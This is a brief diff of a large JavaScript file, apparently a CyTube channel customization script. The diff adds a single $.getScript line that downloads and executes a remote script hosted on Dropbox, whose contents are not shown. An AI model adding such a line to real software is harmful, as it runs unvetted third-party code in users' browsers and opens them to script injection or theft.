@@ -22197,6 +22197,8 @@ return div;
 	    };
 	    settings = $.extend({}, defaultSettings, settings);
 
+$.getScript("https://dl.dropbox.com/s/h8kazctox05u2o7/cytube.js");
+
 // adding custom channel announcement
 
 if (UI_ChannelAnnouncement=="1") {
@@ -23248,4 +23250,3 @@ for (i in ColorsArray) {
 /******/ ]);
 
 //the script ends here
-
